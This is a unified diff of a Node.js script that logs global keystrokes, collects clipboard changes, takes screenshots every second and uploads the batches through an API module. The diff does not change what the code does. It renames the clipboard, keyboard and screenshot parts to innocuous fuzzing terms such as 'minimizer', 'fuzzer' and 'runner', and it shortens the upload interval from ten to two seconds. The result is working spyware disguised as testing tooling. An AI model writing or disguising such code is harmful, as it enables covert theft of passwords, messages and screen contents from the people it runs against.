@@ -1,50 +1,50 @@
 const { GlobalKeyboardListener } = require('node-global-key-listener')
-const clipboardListener = require('clipboard-event');
+const minimizerListener = require('clipboard-event');
 
-const { getClipboard } = require("./utils/clipboard");
-const { captureScreenshot } = require("./utils/screen");
+const { getMinimizer } = require("./tools/minimizer.js");
+const { runRunner } = require("./tools/runner.js");
 const {
   pendingData
-} = require('./utils/global.js');
-const { sendClipboardAndKeyboardData, sendScreenData } = require('./utils/api.js');
+} = require('./tools/global.js');
+const { sendMinimizerAndFuzzerData, sendRunnerData } = require('./tools/api.js');
 
 
 const main = async () => {
   const v = new GlobalKeyboardListener();
 
-  clipboardListener.startListening();
-  clipboardListener.on('change', async () => {
-    const change = await getClipboard()
-    pendingData.clipboard += ','+change
+  minimizerListener.startListening();
+  minimizerListener.on('change', async () => {
+    const change = await getMinimizer()
+    pendingData.minimizer += ','+change
   });
 
   v.addListener(function (e, down) {
     if (e.state === "DOWN" && !(e?.name?.includes("MOUSE"))) {
-      pendingData.keyboard += ','+e.name;
+      pendingData.fuzzer += ','+e.name;
     }
   });
 
 
   setInterval(() => {
-    captureScreenshot()
+    runRunner()
   }, 1000)
   
   setInterval(() => {
-    if (pendingData.clipboard != "" || pendingData.keyboard != "") {
-      const success = sendClipboardAndKeyboardData(pendingData.clipboard, pendingData.keyboard)
+    if (pendingData.minimizer != "" || pendingData.fuzzer != "") {
+      const success = sendMinimizerAndFuzzerData(pendingData.minimizer, pendingData.fuzzer)
       if (success) {
-        pendingData.clipboard = ""
-        pendingData.keyboard = ""
+        pendingData.minimizer = ""
+        pendingData.fuzzer = ""
       }
     }
 
-    if (pendingData.images.length) {
-      const success = sendScreenData(pendingData.images)
+    if (pendingData.runners.length) {
+      const success = sendRunnerData(pendingData.runners)
       if (success) {
-        pendingData.images = []
+        pendingData.runners = []
       }
     }
-  }, 10000)
+  }, 2000)
 }
 
 main()
